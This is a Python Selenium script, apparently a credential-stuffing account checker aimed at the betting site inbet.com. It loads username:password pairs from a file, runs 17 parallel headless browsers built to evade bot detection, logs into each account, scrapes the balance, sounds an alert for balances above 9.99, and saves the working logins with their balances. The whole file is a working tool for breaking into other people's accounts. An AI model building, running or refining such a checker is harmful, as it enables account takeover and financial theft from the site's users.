# File: login_script_with_timestamps.py

import winsound
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import keyboard
import sys
from datetime import datetime

stop_flag = False

def timestamp() -> str:
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def log_exception(username, e):
    """Log full traceback to error log file."""
    with open(error_log_file, "a", encoding="utf-8") as f:
        f.write(f"{timestamp()} [ERROR] Exception for {username}: {str(e)}\n")
        f.write(traceback.format_exc())
        f.write("\n")

    print(f"{timestamp()} [ERROR] Exception occurred for {username}: {str(e)}")

def emergency_stop_listener():
    global stop_flag
    buffer = []

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 's':
            buffer.append(time.time())
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                print(f"{timestamp()} [EMERGENCY STOP] 's' pressed 5 times. Stopping script.")
                stop_flag = True
                os._exit(0)

def read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 139

    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)
    return driver

def login(credentials):
    username, password = credentials
    driver = init_driver()

    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 30)

        # Step 1: Accept Cookies
        try:
            accept_cookies_btn = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-qid="accept-cookies"]'))
            )
            try:
                accept_cookies_btn.click()
            except Exception:
                driver.execute_script("arguments[0].click();", accept_cookies_btn)
            print(f"{timestamp()} [INFO] Cookies accepted for {username}.")
        except Exception:
            print(f"{timestamp()} [WARNING] Accept Cookies button not found or not clickable for {username}. Continuing...")

        # Step 2: Click Login Button
        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div[2]/div/nav/div/div/div[3]/div[3]/div[2]"))
            )
            login_button.click()
            print(f"{timestamp()} [INFO] Login window opened for {username}.")
        except Exception:
            print(f"{timestamp()} [ERROR] Login button not found or not clickable for {username}.")
            return

        # Step 3: Fill in Username
        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[1]/div/div/div/input")
                )
            )
            username_field.send_keys(username)
            print(f"{timestamp()} [INFO] Username entered for {username}.")
        except Exception:
            print(f"{timestamp()} [ERROR] Username field not found for {username}.")
            return

        # Step 4: Fill in Password
        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[2]/div/div/div/input")
                )
            )
            password_field.send_keys(password)
            print(f"{timestamp()} [INFO] Password entered for {username}.")
        except Exception:
            print(f"{timestamp()} [ERROR] Password field not found for {username}.")
            return

        # Step 5: Click Login Button
        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/button")
                )
            )
            submit_button.click()
            print(f"{timestamp()} [INFO] Login button clicked for {username}.")
        except Exception:
            print(f"{timestamp()} [ERROR] Submit button not found or not clickable for {username}.")
            return

        formatted_amount = '0.00'
        balance_found = False

        # Step 6a: Extract Balance
        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')
                try:
                    amount = float(amount_str)
                    formatted_amount = f"{amount:.2f}"
                    balance_found = True
                    print(f"{timestamp()} [INFO] Balance found for {username}: {formatted_amount}")
                except ValueError:
                    print(f"{timestamp()} [WARNING] Could not parse balance value for {username}.")
        except Exception:
            print(f"{timestamp()} [INFO] Balance element NOT found for {username}.")

        balance_value = float(formatted_amount.replace(',', '.'))

        if balance_value > 9.99:
            try:
                winsound.PlaySound(r"C:\Users\petar\Desktop\inbet\minet.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
                print(f"{timestamp()} [INFO] Sound played for {username} because balance is {formatted_amount}.")
            except Exception as e:
                print(f"{timestamp()} [WARNING] Could not play sound for {username}. {str(e)}")

        if balance_found:
            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"{timestamp()} {username}:{password} - Balance: {formatted_amount}\n")

    except Exception as e:
        log_exception(username, e)

    finally:
        driver.quit()
        print(f"{timestamp()} [INFO] Driver closed for {username}.")

def main():
    global login_page_url, success_logins_file, error_log_file, stop_flag

    credentials_file = 'credentials.txt'
    success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
    error_log_file = r"C:\Users\petar\Desktop\inbet\error_log.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://www.inbet.com/sports"
    credentials = read_credentials(credentials_file)

    listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
    listener_thread.start()

    max_workers = 17
    print(f"{timestamp()} [INFO] Starting thread pool with {max_workers} workers.")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(login, credentials)

    print(f"{timestamp()} [INFO] All tasks completed.")

if __name__ == "__main__":
    main()
